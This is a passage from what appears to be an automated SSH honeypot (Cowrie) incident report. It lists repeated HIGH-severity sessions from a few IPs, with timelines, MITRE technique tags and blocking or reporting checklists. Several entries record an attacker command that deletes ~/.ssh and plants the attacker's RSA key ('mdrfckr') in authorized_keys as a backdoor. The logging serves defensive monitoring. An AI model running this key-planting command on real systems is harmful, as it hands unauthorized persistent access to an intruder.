- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60408b907531

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-25 07:52 |
| **Last Seen** | 2026-05-25 07:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:52:38` | `cowrie.session.connect` |
| `2026-05-25 07:52:38` | `cowrie.client.version` |
| `2026-05-25 07:52:39` | `cowrie.client.kex` |
| `2026-05-25 07:52:40` | `cowrie.login.success` |
| `2026-05-25 07:52:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17e0aa4f52fc

| Field | Detail |
|---|---|
| **Source IP** | `34.72.208[.]101` |
| **First Seen** | 2026-05-25 07:54 |
| **Last Seen** | 2026-05-25 07:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:54:49` | `cowrie.session.connect` |
| `2026-05-25 07:54:49` | `cowrie.client.version` |
| `2026-05-25 07:54:49` | `cowrie.client.kex` |
| `2026-05-25 07:54:50` | `cowrie.login.success` |
| `2026-05-25 07:54:50` | `cowrie.session.params` |
| `2026-05-25 07:54:50` | `cowrie.command.input` |
| `2026-05-25 07:54:50` | `cowrie.command.failed` |
| `2026-05-25 07:54:51` | `cowrie.log.closed` |
| `2026-05-25 07:54:51` | `cowrie.session.params` |
| `2026-05-25 07:54:51` | `cowrie.command.input` |
| `2026-05-25 07:54:51` | `cowrie.session.file_download` |
| `2026-05-25 07:54:51` | `cowrie.log.closed` |
| `2026-05-25 07:54:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.72.208[.]101` to AbuseIPDB if not already reported
- [ ] Block `34.72.208[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad3e363b8037

| Field | Detail |
|---|---|
| **Source IP** | `34.72.208[.]101` |
| **First Seen** | 2026-05-25 07:54 |
| **Last Seen** | 2026-05-25 07:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:54:54` | `cowrie.session.connect` |
| `2026-05-25 07:54:54` | `cowrie.client.version` |
| `2026-05-25 07:54:55` | `cowrie.client.kex` |
| `2026-05-25 07:54:56` | `cowrie.login.success` |
| `2026-05-25 07:54:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.72.208[.]101` to AbuseIPDB if not already reported
- [ ] Block `34.72.208[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56f7c7ed9475

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-25 07:56 |
| **Last Seen** | 2026-05-25 07:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:56:48` | `cowrie.session.connect` |
| `2026-05-25 07:56:48` | `cowrie.client.version` |
| `2026-05-25 07:56:48` | `cowrie.client.kex` |
| `2026-05-25 07:56:49` | `cowrie.login.success` |
| `2026-05-25 07:56:49` | `cowrie.session.params` |
| `2026-05-25 07:56:49` | `cowrie.command.input` |
| `2026-05-25 07:56:49` | `cowrie.command.failed` |
| `2026-05-25 07:56:50` | `cowrie.log.closed` |
| `2026-05-25 07:56:50` | `cowrie.session.params` |
| `2026-05-25 07:56:50` | `cowrie.command.input` |
| `2026-05-25 07:56:51` | `cowrie.session.file_download` |
| `2026-05-25 07:56:51` | `cowrie.log.closed` |
| `2026-05-25 07:56:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc6dd2abfff1

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-25 07:56 |
| **Last Seen** | 2026-05-25 07:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:56:54` | `cowrie.session.connect` |
| `2026-05-25 07:56:54` | `cowrie.client.version` |
| `2026-05-25 07:56:54` | `cowrie.client.kex` |
| `2026-05-25 07:56:55` | `cowrie.login.success` |
| `2026-05-25 07:56:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d120a49218a

| Field | Detail |
|---|---|
| **Source IP** | `34.72.208[.]101` |
| **First Seen** | 2026-05-25 08:02 |
| **Last Seen** | 2026-05-25 08:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 08:02:08` | `cowrie.session.connect` |
| `2026-05-25 08:02:08` | `cowrie.client.version` |
| `2026-05-25 08:02:08` | `cowrie.client.kex` |
| `2026-05-25 08:02:09` | `cowrie.login.success` |
| `2026-05-25 08:02:09` | `cowrie.session.params` |
| `2026-05-25 08:02:09` | `cowrie.command.input` |
| `2026-05-25 08:02:09` | `cowrie.command.failed` |
| `2026-05-25 08:02:10` | `cowrie.log.closed` |
| `2026-05-25 08:02:10` | `cowrie.session.params` |
| `2026-05-25 08:02:10` | `cowrie.command.input` |
| `2026-05-25 08:02:10` | `cowrie.session.file_download` |
| `2026-05-25 08:02:10` | `cowrie.log.closed` |
| `2026-05-25 08:02:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.72.208[.]101` to AbuseIPDB if not already reported
- [ ] Block `34.72.208[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70a60d8f7403

| Field | Detail |
|---|---|
| **Source IP** | `34.72.208[.]101` |
| **First Seen** | 2026-05-25 08:02 |
| **Last Seen** | 2026-05-25 08:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 08:02:13` | `cowrie.session.connect` |
| `2026-05-25 08:02:13` | `cowrie.client.version` |
| `2026-05-25 08:02:14` | `cowrie.client.kex` |
| `2026-05-25 08:02:15` | `cowrie.login.success` |
| `2026-05-25 08:02:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.72.208[.]101` to AbuseIPDB if not already reported
- [ ] Block `34.72.208[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60e92b39e2c3

| Field | Detail |
|---|---|
| **Source IP** | `95.84.47[.]155` |
| **First Seen** | 2026-05-25 08:25 |
| **Last Seen** | 2026-05-25 08:26 |
| **Session Duration** | 65s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 08:25:04` | `cowrie.session.connect` |
| `2026-05-25 08:25:04` | `cowrie.client.version` |
| `2026-05-25 08:25:04` | `cowrie.client.kex` |
| `2026-05-25 08:25:05` | `cowrie.login.success` |
| `2026-05-25 08:26:09` | `cowrie.session.file_upload` |
| `2026-05-25 08:26:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.84.47[.]155` to AbuseIPDB if not already reported
- [ ] Block `95.84.47[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80a1cc93db60

| Field | Detail |
|---|---|
| **Source IP** | `163.44.117[.]135` |
| **First Seen** | 2026-05-25 09:14 |
| **Last Seen** | 2026-05-25 09:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 09:14:15` | `cowrie.session.connect` |
| `2026-05-25 09:14:16` | `cowrie.client.version` |
| `2026-05-25 09:14:16` | `cowrie.client.kex` |
| `2026-05-25 09:14:16` | `cowrie.login.success` |
| `2026-05-25 09:14:17` | `cowrie.session.params` |
| `2026-05-25 09:14:17` | `cowrie.command.input` |
| `2026-05-25 09:14:17` | `cowrie.command.failed` |
| `2026-05-25 09:14:17` | `cowrie.log.closed` |
| `2026-05-25 09:14:17` | `cowrie.session.params` |
| `2026-05-25 09:14:17` | `cowrie.command.input` |
| `2026-05-25 09:14:17` | `cowrie.session.file_download` |
| `2026-05-25 09:14:17` | `cowrie.log.closed` |
| `2026-05-25 09:14:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.44.117[.]135` to AbuseIPDB if not already reported
- [ ] Block `163.44.117[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d06dab817cee

| Field | Detail |
|---|---|
| **Source IP** | `163.44.117[.]135` |
| **First Seen** | 2026-05-25 09:14 |
| **Last Seen** | 2026-05-25 09:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 09:14:20` | `cowrie.session.connect` |
| `2026-05-25 09:14:20` | `cowrie.client.version` |
| `2026-05-25 09:14:20` | `cowrie.client.kex` |
| `2026-05-25 09:14:20` | `cowrie.login.success` |
| `2026-05-25 09:14:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.44.117[.]135` to AbuseIPDB if not already reported
- [ ] Block `163.44.117[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c83e6b7bf041

| Field | Detail |
|---|---|
| **Source IP** | `163.44.117[.]135` |
| **First Seen** | 2026-05-25 09:18 |
| **Last Seen** | 2026-05-25 09:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 09:18:22` | `cowrie.session.connect` |
| `2026-05-25 09:18:22` | `cowrie.client.version` |
| `2026-05-25 09:18:23` | `cowrie.client.kex` |
| `2026-05-25 09:18:23` | `cowrie.login.success` |
| `2026-05-25 09:18:24` | `cowrie.session.params` |
| `2026-05-25 09:18:24` | `cowrie.command.input` |
| `2026-05-25 09:18:24` | `cowrie.command.failed` |
| `2026-05-25 09:18:24` | `cowrie.log.closed` |
| `2026-05-25 09:18:24` | `cowrie.session.params` |
| `2026-05-25 09:18:24` | `cowrie.command.input` |
| `2026-05-25 09:18:24` | `cowrie.session.file_download` |
| `2026-05-25 09:18:24` | `cowrie.log.closed` |
| `2026-05-25 09:18:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.44.117[.]135` to AbuseIPDB if not already reported
- [ ] Block `163.44.117[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a252d1f3d59e

| Field | Detail |
|---|---|
| **Source IP** | `163.44.117[.]135` |
| **First Seen** | 2026-05-25 09:18 |
| **Last Seen** | 2026-05-25 09:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 09:18:27` | `cowrie.session.connect` |
| `2026-05-25 09:18:27` | `cowrie.client.version` |
| `2026-05-25 09:18:27` | `cowrie.client.kex` |
| `2026-05-25 09:18:27` | `cowrie.login.success` |
| `2026-05-25 09:18:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.44.117[.]135` to AbuseIPDB if not already reported
- [ ] Block `163.44.117[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a804ab1ee9d5

| Field | Detail |
|---|---|
| **Source IP** | `163.44.117[.]135` |
| **First Seen** | 2026-05-25 09:22 |
| **Last Seen** | 2026-05-25 09:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 09:22:27` | `cowrie.session.connect` |
| `2026-05-25 09:22:27` | `cowrie.client.version` |
| `2026-05-25 09:22:27` | `cowrie.client.kex` |
| `2026-05-25 09:22:27` | `cowrie.login.success` |
| `2026-05-25 09:22:28` | `cowrie.session.params` |
| `2026-05-25 09:22:28` | `cowrie.command.input` |
| `2026-05-25 09:22:28` | `cowrie.command.failed` |
| `2026-05-25 09:22:28` | `cowrie.log.closed` |
| `2026-05-25 09:22:28` | `cowrie.session.params` |
| `2026-05-25 09:22:28` | `cowrie.command.input` |
| `2026-05-25 09:22:28` | `cowrie.session.file_download` |
| `2026-05-25 09:22:28` | `cowrie.log.closed` |
| `2026-05-25 09:22:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.44.117[.]135` to AbuseIPDB if not already reported
- [ ] Block `163.44.117[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cd73f155a80

| Field | Detail |
|---|---|
| **Source IP** | `163.44.117[.]135` |
| **First Seen** | 2026-05-25 09:22 |
| **Last Seen** | 2026-05-25 09:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 09:22:31` | `cowrie.session.connect` |
| `2026-05-25 09:22:31` | `cowrie.client.version` |
| `2026-05-25 09:22:31` | `cowrie.client.kex` |
| `2026-05-25 09:22:31` | `cowrie.login.success` |
| `2026-05-25 09:22:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.44.117[.]135` to AbuseIPDB if not already reported
- [ ] Block `163.44.117[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a481f7fa67e3

| Field | Detail |
|---|---|
| **Source IP** | `163.44.117[.]135` |
| **First Seen** | 2026-05-25 09:26 |
| **Last Seen** | 2026-05-25 09:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 09:26:30` | `cowrie.session.connect` |
| `2026-05-25 09:26:30` | `cowrie.client.version` |
| `2026-05-25 09:26:30` | `cowrie.client.kex` |
| `2026-05-25 09:26:31` | `cowrie.login.success` |
| `2026-05-25 09:26:31` | `cowrie.session.params` |
| `2026-05-25 09:26:31` | `cowrie.command.input` |
| `2026-05-25 09:26:31` | `cowrie.command.failed` |
| `2026-05-25 09:26:31` | `cowrie.log.closed` |
| `2026-05-25 09:26:31` | `cowrie.session.params` |
| `2026-05-25 09:26:31` | `cowrie.command.input` |
| `2026-05-25 09:26:32` | `cowrie.session.file_download` |
| `2026-05-25 09:26:32` | `cowrie.log.closed` |
| `2026-05-25 09:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.44.117[.]135` to AbuseIPDB if not already reported
- [ ] Block `163.44.117[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19528a3440e0

| Field | Detail |
|---|---|
| **Source IP** | `163.44.117[.]135` |
| **First Seen** | 2026-05-25 09:26 |
| **Last Seen** | 2026-05-25 09:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 09:26:34` | `cowrie.session.connect` |
| `2026-05-25 09:26:34` | `cowrie.client.version` |
| `2026-05-25 09:26:34` | `cowrie.client.kex` |
| `2026-05-25 09:26:35` | `cowrie.login.success` |
| `2026-05-25 09:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.44.117[.]135` to AbuseIPDB if not already reported
- [ ] Block `163.44.117[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64a73db94c99

| Field | Detail |
|---|---|
| **Source IP** | `163.44.117[.]135` |
| **First Seen** | 2026-05-25 09:34 |
| **Last Seen** | 2026-05-25 09:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 09:34:44` | `cowrie.session.connect` |
| `2026-05-25 09:34:44` | `cowrie.client.version` |
| `2026-05-25 09:34:44` | `cowrie.client.kex` |
| `2026-05-25 09:34:45` | `cowrie.login.success` |
| `2026-05-25 09:34:45` | `cowrie.session.params` |
| `2026-05-25 09:34:45` | `cowrie.command.input` |
| `2026-05-25 09:34:45` | `cowrie.command.failed` |
| `2026-05-25 09:34:45` | `cowrie.log.closed` |
| `2026-05-25 09:34:45` | `cowrie.session.params` |
| `2026-05-25 09:34:45` | `cowrie.command.input` |
| `2026-05-25 09:34:46` | `cowrie.session.file_download` |
| `2026-05-25 09:34:46` | `cowrie.log.closed` |
| `2026-05-25 09:34:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.44.117[.]135` to AbuseIPDB if not already reported
- [ ] Block `163.44.117[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a82cc368ad8

| Field | Detail |
|---|---|
| **Source IP** | `163.44.117[.]135` |
| **First Seen** | 2026-05-25 09:34 |
| **Last Seen** | 2026-05-25 09:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 09:34:48` | `cowrie.session.connect` |
| `2026-05-25 09:34:48` | `cowrie.client.version` |
